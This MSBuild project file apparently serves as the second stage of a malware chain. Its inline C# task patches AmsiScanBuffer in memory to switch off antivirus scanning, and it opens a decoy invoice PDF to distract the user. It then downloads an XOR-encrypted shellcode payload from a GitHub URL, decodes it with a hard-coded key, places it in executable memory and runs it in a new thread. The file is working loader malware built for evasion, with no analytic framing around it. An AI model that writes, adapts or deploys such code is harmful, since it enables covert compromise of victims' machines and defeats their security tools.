<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- Target to execute our inline task -->
  <Target Name="Evasion">
    <MyTask />
  </Target>
  <UsingTask
    TaskName="MyTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using System.Net;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class MyTask : Task, ITask
        {
          // --- Define Win32 API functions for memory manipulation ---
          [DllImport("kernel32.dll")]
          private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
          [DllImport("kernel32.dll")]
          private static extern IntPtr LoadLibrary(string name);
          [DllImport("kernel32.dll")]
          private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
          [DllImport("kernel32.dll")]
          public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
          [DllImport("kernel32.dll")]
          public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
          
          private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

          public override bool Execute()
          {
            // STAGE 2, ACTION 1: AMSI Bypass
            Bypass();

            // STAGE 2, ACTION 2: Decoy Action
            try
            {
              // Download and "open" the legit PDF. This will launch the default browser/PDF viewer.
              Process.Start("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice for Load ID 80814532.pdf");
            }
            catch {}

            // STAGE 2, ACTION 3: Download & DeXOR Payload
            WebClient client = new WebClient();
            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
            byte[] encryptedShellcode = client.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
            
            byte[] shellcode = new byte[encryptedShellcode.Length];
            for (int i = 0; i < encryptedShellcode.Length; i++)
            {
              shellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
            }

            // STAGE 2, ACTION 4: Inject and Execute Shellcode in current process
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); // 0x3000 = MEM_COMMIT | MEM_RESERVE; 0x40 = PAGE_EXECUTE_READWRITE
            Marshal.Copy(shellcode, 0, mem, shellcode.Length);
            CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);

            return true;
          }

          // --- AMSI Bypass Logic ---
          private static void Bypass()
          {
            try
            {
              // This is the name for which you should make a hash: AmsiScanBuffer
              string lib = "am" + "si" + ".dll"; // Obfuscate strings
              string func = "Amsi" + "Scan" + "Buffer";

              IntPtr libHandle = LoadLibrary(lib);
              IntPtr funcAddress = GetProcAddress(libHandle, func);
              
              // This patch is for x86 (32-bit) processes
              byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
                                                                     // This error code (E_INVALIDARG) makes AMSI think the call is invalid, effectively disabling it.
              
              uint oldProtect;
              VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect); // 0x40 = PAGE_EXECUTE_READWRITE
              Marshal.Copy(patch, 0, funcAddress, patch.Length);
              VirtualProtect(funcAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            }
            catch {}
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
